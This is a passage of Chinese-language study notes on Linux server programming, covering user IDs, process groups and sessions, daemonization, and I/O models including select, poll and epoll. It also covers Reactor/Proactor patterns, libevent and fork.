组成</li></ul></li><li><p><strong>日志输出与存储</strong>：</p><ul><li>日志被写入到指定的日志文件，如：<ul><li><code>/var/log/messages</code>：系统通用日志</li><li><code>/var/log/secure</code>：认证和安全相关日志</li><li><code>/var/log/maillog</code>：邮件日志</li><li><code>/var/log/cron</code>：定时任务日志</li><li><code>/var/log/kern.log</code>：内核日志</li></ul></li><li>或者转发至 <strong>远程日志服务器</strong> 或<strong>数据库</strong> 进行集中存储和分析。</li></ul></li></ol><h3 id="用户信息">用户信息</h3><p>EGID/EUID存在的⽬的是⽅便资源访问，给运⾏⽬标程序的(组)⽤户提供有效(组)用户的权限。</p><blockquote><p>示例：</p><ul><li><p><strong><code>su</code> 程序</strong> 在<strong>普通用户启动时</strong>，<strong>EUID 临时变为<code>root</code></strong>，从而拥有 <code>root</code> 权限。</p></li><li><p>由于 SUID 位（即set-user-id 标志）被设置，则 <strong>EUID 变为root</strong>，进程可以 <strong>访问和修改 <code>/etc/passwd</code>文件</strong>，并执行切换用户的操作。</p></li></ul></blockquote><ol type="1"><li><p>获取用户信息</p><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="type">uid_t</span> <span class="title">getuid</span><span class="params">(<span class="type">void</span>)</span></span>;   <span class="comment">// 获取 真实用户 ID (UID)</span></span><br><span class="line"><span class="function"><span class="type">uid_t</span> <span class="title">geteuid</span><span class="params">(<span class="type">void</span>)</span></span>;  <span class="comment">// 获取 有效用户 ID (EUID)</span></span><br><span class="line"><span class="function"><span class="type">gid_t</span> <span class="title">getgid</span><span class="params">(<span class="type">void</span>)</span></span>;   <span class="comment">// 获取 真实组 ID (GID)</span></span><br><span class="line"><span class="function"><span class="type">gid_t</span> <span class="title">getegid</span><span class="params">(<span class="type">void</span>)</span></span>;  <span class="comment">// 获取 有效组 ID (EGID)</span></span><br></pre></td></tr></tbody></table></figure></li><li><p>设置用户信息</p><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">setuid</span><span class="params">(<span class="type">uid_t</span> uid)</span></span>;       <span class="comment">// 设置 真实用户 ID 和 有效用户 ID</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">seteuid</span><span class="params">(<span class="type">uid_t</span> euid)</span></span>;     <span class="comment">// 设置 有效用户 ID</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">setgid</span><span class="params">(<span class="type">gid_t</span> gid)</span></span>;       <span class="comment">// 设置 真实组 ID 和 有效组 ID</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">setegid</span><span class="params">(<span class="type">gid_t</span> egid)</span></span>;     <span class="comment">// 设置 有效组 ID</span></span><br></pre></td></tr></tbody></table></figure></li></ol><h3 id="进程间关系">进程间关系</h3><h4 id="进程组">进程组</h4><ul><li>每个进程组都有一个唯一的 <strong>进程组 ID(PGID)</strong>，用于标识该组中的所有进程。</li><li><strong>PGID（Process GroupID）</strong>：进程组的唯一标识符，等于该组<strong>首领进程（LeaderProcess）</strong> 的 PID（进程 ID）。</li><li><strong>首领进程</strong>：最先创建进程组的进程，PGID 等于它的PID。如果首领进程退出，进程组不会消失，但其他进程的 PGID不变。进程组将⼀直存在，直到其中<strong>所有进程</strong>都退出，或者加⼊到其他进程组。</li></ul><h4 id="会话">会话</h4><ul><li><p>一组相关的进程组组成一个会话，每个会话有一个唯一的<strong>SID（Session ID）</strong>。</p></li><li><p><strong>Session ID(SID)</strong>：会话的唯一标识符，等于会话首领进程（Session Leader）的PID。</p></li><li><p><strong>会话首领进程</strong>：创建会话的进程，SID 等于它的PID。这个进程可以成为<strong>守护进程</strong>。</p><blockquote><p><strong>调用进程不能是当前进程组的组长</strong>，否则会返回错误。这是因为：</p><ul><li>如果组长进程调用 <code>setsid()</code>，那么它的 <strong>PGID(Process Group ID)</strong> 和 <strong>PID (Process ID)</strong>相同，而 <code>setsid()</code>要求调用进程成为<strong>新进程组的组长</strong>，即 <strong>PGID =PID</strong>。如果它本身已经是组长，就无法改变 PGID，因此被禁止。</li></ul></blockquote></li></ul><h4 id="ps命令"><code>ps</code>命令</h4><p>用于<strong>查看系统中正在运行的进程</strong>。它可以显示进程的PID、PPID、PGID、SID、TTY、状态、内存占用等详细信息。</p><ol type="1"><li><p>查看所有进程的层级关系</p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ps -ef --forest</span><br></pre></td></tr></tbody></table></figure></li><li><p>查看会话、进程组和 PID 的关系</p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ps -eo pid,ppid,pgid,sid,tty,stat,comm</span><br></pre></td></tr></tbody></table></figure></li><li><p>查看当前 Shell 会话中的所有进程</p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ps -o pid,ppid,pgid,sid,tty,stat,comm</span><br></pre></td></tr></tbody></table></figure></li><li><p>查看前后台作业及进程</p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ps -o pid,tty,stat,comm</span><br></pre></td></tr></tbody></table></figure></li><li><p>查看某个用户的所有进程</p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ps -u username</span><br></pre></td></tr></tbody></table></figure></li></ol><h3 id="系统资源限制">系统资源限制</h3><ul><li><strong><code>getrlimit(int resource, struct rlimit \*rlim)</code></strong>：获取指定资源的<strong>软限制</strong>和<strong>硬限制</strong>。</li><li><strong><code>setrlimit(int resource, const struct rlimit \*rlim)</code></strong>：设置指定资源的<strong>软限制</strong>和<strong>硬限制</strong>。</li></ul><h3 id="改变目录">改变目录</h3><ol type="1"><li><p>获取<strong>当前工作目录</strong>的<strong>绝对路径</strong></p><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">char</span> *<span class="title">getcwd</span><span class="params">(<span class="type">char</span> *buf, <span class="type">size_t</span> size)</span></span>;</span><br></pre></td></tr></tbody></table></figure><ul><li><code>buf</code>：用于存储路径的缓冲区。</li><li><code>size</code>：缓冲区大小。</li><li>返回值：成功返回 <code>buf</code>；失败返回<code>NULL</code>，并设置 <code>errno</code></li></ul></li><li><p>切换目录</p><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">chdir</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *path)</span></span>;</span><br></pre></td></tr></tbody></table></figure><ul><li><code>path</code>：目标目录的路径（绝对路径或相对路径）。</li><li>返回值：成功返回 <code>0</code>；失败返回 <code>-1</code>，并设置<code>errno</code></li></ul></li></ol><h3 id="服务器程序后台化">服务器程序后台化</h3><ol type="1"><li><strong>创建子进程</strong> 并退出父进程，防止继续占用<strong>终端</strong>。</li><li><strong>调用 <code>setsid()</code></strong>：<ul><li>创建新会话 (<code>session</code>)，并成为会话首进程。</li><li>成为新进程组的<strong>组长</strong>。</li><li><strong>脱离</strong> 控制终端。</li></ul></li><li><strong>重设文件权限掩码</strong>：<ul><li>使用 <code>umask(0)</code> 确保子进程可以创建任何权限的文件。</li></ul></li><li><strong>更改工作目录</strong>：<ul><li>通常切换到根目录：<code>chdir("/")</code>，防止<strong>占用文件系统</strong>。</li></ul></li><li><strong>关闭文件描述符</strong>：<ul><li>关闭 <strong>stdin, stdout, stderr</strong>(<code>0, 1, 2</code>)，防止<strong>占用终端资源</strong>。</li></ul></li><li><strong>重定向文件描述符</strong>：<ul><li>重定向 <code>stdin, stdout, stderr</code> 到<strong><code>/dev/null</code></strong> 或<strong>日志文件</strong>。</li></ul></li></ol><h2 id="io模型">I/O模型</h2><p>其中最重要的就是<strong>I/O复用</strong></p><h3 id="阻塞io">阻塞I/O</h3><p>进程发起 I/O请求后，线程会一直阻塞，直到数据准备好并被复制到用户空间，I/O操作才完成。</p><p><strong>流程</strong>：</p><ol type="1"><li>进程调用 <code>read()</code>，如果数据未准备好，进程进入<strong>阻塞状态</strong>。</li><li>内核等待数据准备好，并从内核缓冲区复制到用户空间。</li><li><code>read()</code> 返回，进程继续执行。</li></ol><h3 id="非阻塞io">非阻塞I/O</h3><p>进程发起I/O请求后，不管数据是否准备好都会直接返回。</p><p><strong>流程</strong>：</p><ol type="1"><li>进程调用 <code>read()</code>：<ul><li><strong>如果数据已准备好</strong>，<code>read()</code>立即返回数据。</li><li><strong>如果数据未准备好</strong>，<code>read()</code> 立即返回<code>-1</code>，并设置 <code>errno = EAGAIN</code>（不会阻塞）。</li></ul></li><li>进程通常会<strong>轮询</strong>（不断调用<code>read()</code>）直到数据可用。</li></ol><h3 id="信号驱动io">信号驱动I/O</h3><p>让内核在 I/O 事件发生时发送信号 (<code>SIGIO</code>)通知进程，进程在信号处理程序中执行 I/O 操作。</p><p><strong>流程</strong>：</p><ol type="1"><li>进程调用 <code>fcntl()</code> 启用 <code>O_ASYNC</code>标志，让内核在 I/O 事件发生时发送 <code>SIGIO</code> 信号。</li><li>进程继续执行其他任务，不阻塞。</li><li>当数据可用时，内核发送 <code>SIGIO</code> 信号。</li><li>信号处理函数调用 <code>read()</code> 读取数据。</li></ol><h3 id="异步io">异步I/O</h3><p>进程发起 I/O 请求后<strong>不会阻塞</strong>，内核在 I/O操作完成后通知进程。</p><p><strong>流程</strong>：</p><ol type="1"><li>进程调用 <code>aio_read()</code> 让内核执行 I/O 操作。</li><li>进程立即继续执行其他任务，不阻塞。</li><li>内核完成 I/O 后，主动通知进程（如回调函数或 <code>SIGEV</code>机制）。</li><li>进程获取数据，I/O 操作完成。</li></ol><blockquote><p>异步I/O与信号驱动I/O的区别</p><p><strong>信号驱动 I/O (<code>SIGIO</code>)</strong>：</p><ul><li>只是<strong>提前通知</strong>进程 “数据可读”，但进程仍需<code>read()</code> 获取数据。</li><li>适用于<strong>高并发网络 I/O</strong>（但现代高性能服务器一般用<code>epoll</code>）。</li></ul><p><strong>异步 I/O (AIO)</strong>：</p><ul><li><strong>真正的异步</strong>，内核完成 I/O 后数据已就绪，无需<code>read()</code>。</li><li>适用于<strong>高吞吐文件 I/O</strong>，如数据库、存储系统(<code>io_uring</code> 适用于网络和文件)。</li></ul></blockquote><h3 id="io复用">I/O复用</h3><p>通过 <code>select()</code>、<code>poll()</code> 或<code>epoll()</code> 让一个线程同时监视多个 I/O 事件，提高并发能力。</p><p><strong>流程</strong>：</p><ol type="1"><li>进程调用<code>select()</code>/<code>poll()</code>/<code>epoll_wait()</code>，等待多个文件描述符的状态变化。</li><li>如果某个描述符准备好，进程再去执行 <code>read()</code>。</li><li><code>read()</code>仍然是阻塞的，但因为之前已经确认了数据可读，阻塞时间很短。</li></ol><h4 id="select">select</h4><p><code>select()</code> 函数是一种 <strong>I/O 多路复用</strong>技术，它可以 <strong>同时监听多个文件描述符 (File Descriptor,FD)</strong> 的状态。</p><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/select.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">select</span><span class="params">(<span class="type">int</span> nfds, fd_set *readfds, fd_set *writefds, fd_set *exceptfds, <span class="keyword">struct</span> timeval *timeout)</span></span>;</span><br></pre></td></tr></tbody></table></figure><p>参数说明：</p><table><colgroup><col style="width: 15%"><col style="width: 84%"></colgroup><thead><tr class="header"><th>参数</th><th>说明</th></tr></thead><tbody><tr class="odd"><td><code>nfds</code></td><td>监听的最大文件描述符的值加 1（仅 Linux 需要，Windows忽略此参数）。</td></tr><tr class="even"><td><code>readfds</code></td><td>监听可读事件的文件描述符集合（可为 <code>NULL</code>）。</td></tr><tr class="odd"><td><code>writefds</code></td><td>监听可写事件的文件描述符集合（可为 <code>NULL</code>）。</td></tr><tr class="even"><td><code>exceptfds</code></td><td>监听异常事件的文件描述符集合（可为 <code>NULL</code>）。</td></tr><tr class="odd"><td><code>timeout</code></td><td>设定超时时间，可为 <code>NULL</code>（表示无限等待）。</td></tr></tbody></table><p>select成功时返回就绪（可读、可写和异常）⽂件描述符的总数。如果在超时时间内没有任何⽂件描述符就绪，select将返回0。select失败时返回-1。</p><p>下面是<code>select</code>监听的文件操作符可能出现的状态：（<code>FD_ISSET</code>用于判断状态是否变化即是否就绪，例如<code>FD_ISSET(fd, &amp;readfds)</code>用于检查某个文件描述符 (<code>fd</code>) 是否<strong>在<code>readfds</code> 集合中被标记为可读</strong>。）</p><table><colgroup><col style="width: 25%"><col style="width: 75%"></colgroup><thead><tr class="header"><th style="text-align: center;">监听类型</th><th style="text-align: center;">触发条件</th></tr></thead><tbody><tr class="odd"><td style="text-align: center;"><strong>可读<code>readfds</code></strong></td><td style="text-align: center;">1. <code>socket</code> 有数据可读<br>2. <code>accept()</code> 有新连接 <br>3. <code>read()</code>返回 0（对端关闭） <br>4. 终端、管道、文件可读</td></tr><tr class="even"><td style="text-align: center;"><strong>可写<code>writefds</code></strong></td><td style="text-align: center;">1. <code>socket</code> 发送缓冲区可用<br>2. <code>connect()</code> 非阻塞模式完成 <br>3.<code>write()</code> 不会阻塞</td></tr><tr class="odd"><td style="text-align: center;"><strong>异常<code>exceptfds</code></strong></td><td style="text-align: center;">1. <code>connect()</code> 失败 <br>2.<code>MSG_OOB</code> <strong>带外数据</strong> <br>3. TCP 连接复位(RST)</td></tr></tbody></table><blockquote><p><code>fd_set</code>：<strong>文件描述符（filedescriptor）集合</strong>，只能存 1024 个文件描述符</p><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">FD_ZERO</span><span class="params">(fd_set *set)</span></span>;    <span class="comment">// 清空集合</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">FD_SET</span><span class="params">(<span class="type">int</span> fd, fd_set *set)</span></span>;  <span class="comment">// 添加文件描述符</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">FD_CLR</span><span class="params">(<span class="type">int</span> fd, fd_set *set)</span></span>;  <span class="comment">// 从集合中移除文件描述符</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">FD_ISSET</span><span class="params">(<span class="type">int</span> fd, fd_set *set)</span></span>; <span class="comment">// 检查文件描述符是否准备就绪</span></span><br></pre></td></tr></tbody></table></figure></blockquote><p>两种应用：</p><p><strong><code>select()</code> + 非阻塞I/O（纯事件驱动模型）</strong>：</p><ul><li>适用于 <strong>高并发、轻量级连接</strong> 的场景，如<strong>聊天室、HTTP 代理服务器</strong>。</li><li>无需多进程或多线程，<strong>单线程即可管理和处理多个连接</strong>。</li></ul><p><strong><code>select()</code> +<code>fork()</code>（混合模型）</strong>：</p><ul><li>适用于 <strong>中小规模并发</strong> 且<strong>每个连接需要较重业务处理</strong> 的场景，如<strong>文件上传、数据计算</strong>。</li><li>通过 <strong>子进程避免阻塞主进程</strong>，简化了 <strong>I/O操作的编程模型</strong>。</li></ul><h4 id="poll">poll</h4><p><code>poll()</code> 是 <code>select()</code> 的改进版，<strong>去除了1024 个文件描述符（fd）的限制</strong>，但仍然需要遍历整个 fd列表。poll系统调⽤的返回值的含义与select相同。</p><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;poll.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">poll</span><span class="params">(<span class="keyword">struct</span> pollfd *fds, <span class="type">nfds_t</span> nfds, <span class="type">int</span> timeout)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// pollfd 结构体</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">pollfd</span> {</span><br><span class="line">    <span class="type">int</span> fd;         <span class="comment">// 监听的文件描述符</span></span><br><span class="line">    <span class="type">short</span> events;   <span class="comment">// 监听的事件（POLLIN-可读, POLLOUT-可写, POLLERR-错误）</span></span><br><span class="line">    <span class="type">short</span> revents;  <span class="comment">// 触发的事件（由内核填充）</span></span><br><span class="line">};</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><p>参数：</p><ul><li><code>fds</code>: <code>pollfd</code>结构体数组，存放要监听的文件描述符及其事件。</li><li><code>nfds</code>: <code>fds</code> 数组的大小。</li><li><code>timeout</code>: 超时时间（毫秒），<code>-1</code>表示无限等待，<code>0</code> 表示立即返回。</li></ul><h4 id="epoll">epoll</h4><p><code>epoll</code> 是 Linux 特有的 <strong>高效 I/O 复用</strong>机制，适用于 <strong>高并发场景（如 1 万个 socket）</strong>。</p><p><strong>(1) <code>epoll_create()</code>创建内核事件表（epoll实例）</strong></p><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/epoll.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">epoll_create</span><span class="params">(<span class="type">int</span> flags)</span></span>;</span><br></pre></td></tr></tbody></table></figure><ul><li><strong>创建内核事件表</strong>，返回 <code>epfd</code>（失败返回<code>-1</code>）。</li></ul><p><strong>(2) <code>epoll_ctl()</code> 添加/删除/修改 fd（即管理fd）</strong></p><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">epoll_ctl</span><span class="params">(<span class="type">int</span> epfd, <span class="type">int</span> op, <span class="type">int</span> fd, <span class="keyword">struct</span> epoll_event *event)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// epoll_event 结构体</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">epoll_event</span> {</span><br><span class="line">    <span class="type">uint32_t</span> events;  <span class="comment">// 监听的事件（EPOLLIN, EPOLLOUT 等，还包括EPOLLET-边缘触发模式）</span></span><br><span class="line">    <span class="type">epoll_data_t</span> data; <span class="comment">// 用户数据（通常存 fd）</span></span><br><span class="line">};</span><br></pre></td></tr></tbody></table></figure><ul><li><code>epfd</code>: <code>epoll_create()</code> 返回的 epoll句柄。</li><li><code>op</code>: 操作类型：<ul><li><code>EPOLL_CTL_ADD</code>：添加 <code>fd</code>。</li><li><code>EPOLL_CTL_MOD</code>：修改 <code>fd</code> 监听的事件。</li><li><code>EPOLL_CTL_DEL</code>：删除 <code>fd</code>。</li></ul></li><li><code>fd</code>: 需要监听的文件描述符（socket）。</li><li><code>event</code>: 监听的事件。</li></ul><p><strong>(3) <code>epoll_wait()</code> 获取发生事件的 fd</strong></p><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">epoll_wait</span><span class="params">(<span class="type">int</span> epfd, <span class="keyword">struct</span> epoll_event *events, <span class="type">int</span> maxevents, <span class="type">int</span> timeout)</span></span>;</span><br></pre></td></tr></tbody></table></figure><ul><li><code>epfd</code>: <code>epoll_create()</code> 返回的 epoll句柄。</li><li><code>events</code>: 用于存储触发事件的 <code>epoll_event</code>数组。</li><li><code>maxevents</code>: <code>events</code> 数组的大小（建议设置为<code>10</code>~<code>1000</code>）。</li><li><code>timeout</code>: 超时时间（毫秒），<code>-1</code>表示无限等待，<code>0</code> 表示立即返回。</li></ul><p><strong>(4) LT（水平触发）和ET（边缘触发）模式</strong></p><p>LT：只要数据未被读取，<code>epoll_wait()</code><strong>一直返回</strong> 可读事件。</p><p>ET：<strong>只在状态变化时通知一次</strong>，如果不立即处理，<code>epoll_wait()</code><strong>不会再次通知</strong>。</p><ol type="1"><li><strong>LT（Level Triggered，水平触发）模式</strong></li></ol><ul><li><strong>行为</strong>：<ul><li>只要文件描述符处于就绪状态（即有数据可读或可写），epoll就会持续通知应用程序。</li><li>如果应用程序没有处理完所有数据，epoll 会在下一次调用 epoll_wait时再次通知。</li></ul></li><li>特点:<ul><li>简单易用: 适合初学者或简单的应用场景。</li><li>容错性强:即使应用程序没有一次性处理完所有数据，也不会丢失事件。</li><li>可能效率较低: 如果应用程序没有及时处理数据，epoll会频繁通知，导致不必要的开销。</li></ul></li><li>适用场景:<ul><li>需要兼容性强的场景（如传统的 select 或 poll 迁移到 epoll）。</li><li>对性能要求不高的场景。</li></ul></li></ul><ol start="2" type="1"><li><strong>ET（Edge Triggered，边缘触发）模式</strong></li></ol><ul><li><strong>行为</strong>:<ul><li>只有当文件描述符的状态发生变化时（如从无数据变为有数据），epoll才会通知应用程序。</li><li>如果应用程序没有处理完所有数据，epoll不会再次通知，除非文件描述符的状态再次发生变化。</li></ul></li><li>特点:<ul><li>高效: 减少了不必要的通知，适合高性能场景。</li><li>需要一次性处理完数据:应用程序必须确保在一次事件通知中处理完所有数据，否则可能会丢失后续事件。</li><li>复杂性较高: 需要更精细的控制，通常与非阻塞 I/O 结合使用。</li></ul></li><li>适用场景:<ul><li>高性能服务器（如 Web 服务器、游戏服务器）。</li><li>需要处理大量并发连接的场景。</li></ul></li></ul><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">event.events = EPOLLIN; <span class="comment">// LT 模式</span></span><br><span class="line"><span class="comment">// event.events = EPOLLIN | EPOLLET; // ET 模式</span></span><br><span class="line"><span class="built_in">epoll_ctl</span>(epfd, EPOLL_CTL_ADD, socket_fd, &amp;event);</span><br></pre></td></tr></tbody></table></figure><blockquote><p><code>EPOLLONESHOT</code> 是 <code>epoll</code>监听事件的一个<strong>特殊标志</strong>，它的作用是：</p><ul><li><strong>事件触发一次后，自动从 <code>epoll</code>监听列表中移除</strong>。</li><li><strong>适用于多线程环境</strong>，防止多个线程同时处理同一个<code>fd</code>。</li></ul></blockquote><blockquote><p><strong>内核事件表（Kernel Event Table）</strong> 是<strong><code>epoll</code></strong>机制的<strong>核心数据结构</strong>，用于<strong>存储和管理需要监听的文件描述符（fd）及其事件</strong>。它由Linux 内核维护，提供了高效的事件通知机制。</p><ol type="1"><li><p>为什么需要内核事件表？</p><p>在 <code>select()</code> 和 <code>poll()</code>机制中，用户进程<strong>每次调用</strong>都要<strong>传递所有监听的fd</strong>，导致<strong>大量数据拷贝和遍历</strong>，影响性能。</p><p><strong><code>epoll</code> 的改进：</strong></p><ol type="1"><li><p><strong>fd 只需注册一次</strong>，存入<strong>内核事件表</strong>，后续内核自动管理。</p></li><li><p><strong>避免无效 fd 遍历</strong>，只返回<strong>发生事件的fd</strong>，提高效率（<code>O(1)</code>）。</p></li></ol></li><li><p>内核事件表的组成</p><p>内核事件表可以理解为一个<strong>红黑树 + 就绪列表</strong>：</p><ol type="1"><li><strong>监听 fd 的红黑树</strong></li></ol><ul><li>作用：存储 <strong>所有已注册的 fd</strong>，支持高效的<strong>增/删/改</strong>。</li><li>由 <code>epoll_ctl()</code> 进行管理。</li></ul><ol start="2" type="1"><li><strong>事件就绪列表</strong></li></ol><ul><li>作用：存储 <strong>发生事件的 fd</strong>。</li><li><code>epoll_wait()</code> 只返回<strong>就绪列表中的fd</strong>，避免无效遍历，提高性能</li></ul></li></ol></blockquote><h2 id="两种事件处理模式">两种事件处理模式</h2><h3 id="reactor模式">Reactor模式</h3><p>使⽤<strong>同步I/O模型</strong>实现。其主要特点是<strong>由一个或多个I/O 多路复用器（如<code>select</code>、<code>poll</code>、<code>epoll</code>）监听事件</strong>，当事件发生时，通知相应的事件处理器进行处理。</p><ul><li><strong>主线程</strong> 监听 I/O 事件，分发任务。</li><li><strong>工作线程</strong> 处理 I/O 和业务逻辑，通常使用线程池。</li><li>适用于 <strong>高并发短 I/O 操作</strong>，如 <code>epoll</code>服务器（Nginx、Redis）。</li></ul><h3 id="proactor模式">Proactor模式</h3><p>使⽤<strong>异步I/O模型</strong>实现。其核心思想是<strong>由操作系统内核完成I/O操作后再通知应用程序</strong>，即事件的处理由内核负责，而不是应用程序主动去检查事件状态。</p><ul><li><strong>主线程</strong> 提交异步 I/O，等待操作系统通知完成。</li><li><strong>操作系统</strong> 负责实际 I/O 读取和写入。</li><li><strong>工作线程</strong> 只处理完成的 I/O 数据，执行业务逻辑。</li><li>适用于 <strong>长时间异步 I/O 操作</strong>，如 Windows IOCP。</li></ul><h2 id="两种并发模式">两种并发模式</h2><h3 id="半同步半异步">半同步/半异步</h3><ol type="1"><li><p>下面这种也叫<strong>半同步/半反应堆</strong>模式</p><figure><img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/image-20250222231946543.png" alt="image-20250222231946543"><figcaption aria-hidden="true">image-20250222231946543</figcaption></figure><p>上图中的异步线程只有⼀个，由主线程来充当，工作线程都是同步线程</p></li><li><p>下面是⾼效的<strong>半同步/半异步</strong>模式</p><figure><img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/image-20250222232510227.png" alt="image-20250222232510227"><figcaption aria-hidden="true">image-20250222232510227</figcaption></figure><p>注意这里的主线程只管理<strong>监听socket</strong>，而<strong>连接socket</strong>交给工作线程管理。在这种⾼效的半同步/半异步模式中，每个线程都⼯作在异步模式。所以它并⾮严格意义上的半同步/半异步模式。</p></li></ol><h3 id="领导者追随者模式">领导者/追随者模式</h3><ul><li>多个⼯作线程轮流获得事件源集合，轮流监听、分发并处理事件</li><li>在任意时间点，程序都仅有⼀个领导者线程，它负责监听I/O事件。</li><li>其他线程则都是追随者，它们休眠在线程池中等待成为新的领导者</li><li>当前的领导者如果检测到I/O事件，⾸先要从线程池中推选出新的领导者线程，然后(当前领导者)处理I/O事件，新领导者等待新的I/O事件</li></ul><h2 id="libevent-框架">Libevent 框架</h2><p><code>libevent</code> 的核心概念可以通过以下方式理解：</p><ul><li><strong>事件处理器</strong>：事件处理器负责处理特定类型的事件，它们定义了事件的源（如文件描述符、信号等）和触发条件（如可读、可写、信号到来、定时器到期等）。每个事件处理器都绑定了一个回调函数，事件发生时，回调函数会被调用。</li><li><strong>事件多路分发器</strong>：事件分发器负责使用操作系统的 I/O多路复用机制来监听事件源的状态，并触发相应的回调。它管理和调度所有事件的执行。</li><li><strong>事件队列</strong>：事件队列是 <code>libevent</code>用来存储和调度事件的结构，它保证了事件按照正确的顺序（优先级、时间顺序等）进行调度。事件队列也负责管理I/O、定时器、信号等类型的事件，并将它们传递给事件分发器进行执行。</li></ul><p><strong>核心结构</strong></p><ul><li><code>event_base</code>：事件分发器，管理所有事件。</li><li><code>event</code>：事件处理器，表示具体的I/O、信号、定时器事件。</li></ul><p><strong>主要流程</strong></p><ol type="1"><li><p><strong>创建事件循环</strong> →<code>event_base_new()</code></p></li><li><p><strong>创建事件</strong> → <code>event_new()</code></p></li><li><p><strong>注册事件</strong> → <code>event_add()</code></p><blockquote><p><code>event_add()</code>只是将事件添加到事件循环中，并将其注册到事件队列。它告诉<code>libevent</code> 这个事件（例如 I/O事件、信号事件）应当被监听和调度，但是它并没有<strong>直接建立事件源与事件处理器之间的映射关系</strong>。对于信号事件（例如<code>SIGINT</code>），这时就需要通过内部的映射函数来将信号（如<code>SIGINT</code>）与对应的事件处理器进行关联。具体而言，<code>evmap_signal_add()</code>就是用来处理这种信号与事件处理器的映射关系。</p></blockquote></li><li><p><strong>启动事件循环</strong> →<code>event_base_dispatch()</code></p></li><li><p><strong>触发事件并执行回调</strong></p></li><li><p><strong>释放资源</strong> → <code>event_free()</code> /<code>event_base_free()</code></p></li></ol><p><strong>事件处理机制</strong></p><ul><li><strong>I/O 事件</strong>：监听文件描述符的可读/可写状态。</li><li><strong>信号事件</strong>：监听系统信号（如<code>SIGINT</code>）。</li><li><strong>定时器事件</strong>：在指定时间后触发回调。</li></ul><h2 id="多进程编程">多进程编程</h2><h3 id="exec与fork">exec与fork</h3><ol type="1"><li><p><code>fork</code> 之后的内存状态</p><p>当你调用 <code>fork</code>时，操作系统会创建一个新的进程（子进程），子进程是父进程的副本。这意味着：</p><ul><li>子进程会复制父进程的代码段、数据段、堆栈、打开的文件描述符等。</li><li><strong>在 <code>fork</code>的瞬间，父进程和子进程的内存内容是完全相同的</strong>。</li></ul><p>但是，现代操作系统使用了一种称为 <strong>写时复制（Copy-On-Write,COW）</strong> 的技术来优化 <code>fork</code> 